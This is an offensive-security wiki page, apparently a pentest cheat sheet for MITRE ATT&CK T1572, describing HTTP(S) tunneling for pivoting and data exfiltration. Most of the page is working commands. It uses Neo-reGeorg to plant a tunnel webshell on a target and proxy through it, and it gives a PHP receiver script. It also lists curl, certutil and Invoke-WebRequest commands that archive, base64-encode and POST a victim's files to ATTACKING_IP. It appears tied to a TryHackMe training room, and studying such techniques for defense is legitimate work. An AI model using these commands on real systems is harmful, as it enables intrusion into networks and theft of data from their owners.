---
description: MITRE ATT&CK™ Protocol Tunneling  - ID T1572
---

# HTTP(s) Tunneling

## Theory

Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel. We can pivoting throught this.

{% hint style="danger" %}
We can also use HTTP(S) Tunneling as a good [exfiltration](../exfiltration/) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Neo-reGeorg" %}
we will be using [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) to achieve tunneling. On our attacking machine we do:

```bash
v4resk@kali$ python3 neoreg.py generate -k 'P@ssw0rd!'
```

then, we have to upload generated files to the target machine and host then on a webserver. On the attacking machine we can do:

```bash
#Establish sock5 proxy
v4resk@kali$ python3 neoreg.py -k 'P@ssw0rd!' -u http://MACHINE_IP/uploader/files/tunnel.php

#We can now use it as sock5 proxy 
v4resk@kali$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```
{% endtab %}

{% tab title="Curl" %}
We will host a simple PHP server in order to retrieve encoded POST data.

First write the following code in your `index.php` file

```php
<?php
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
}
?>
```

Second, start the PHP web-server in the same directory

<pre class="language-bash"><code class="lang-bash"># Start server on port 80
<strong>v4resk㉿kali$ php -S 0.0.0.0:80
</strong></code></pre>

On the victime computer, you can now send data through POST request. It will be saved at `/tmp/http.bs64`

```bash
# Linux
# Compress folder, base64, and send
user@victime$ curl --data "file=$(tar zcf - Bashed | base64)" http://ATTACKING_IP/

# Windows
# Base64 file, and send 
user$ certutil -encode fileToSend b64FileToSend
user$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@b64FileToSend" https://ATTACKING_IP/
user$ Invoke-WebRequest -Method POST -ContentType "application/octet-stream" -InFile "b64FileToSend" -Uri https://ATTACKING_IP/d
```

On attacking machine, we can decode now decode it:

<pre class="language-bash"><code class="lang-bash"># Decode compressed folders
<strong>v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
</strong><strong>
</strong><strong># Decode windows file 
</strong>v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d
</code></pre>
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
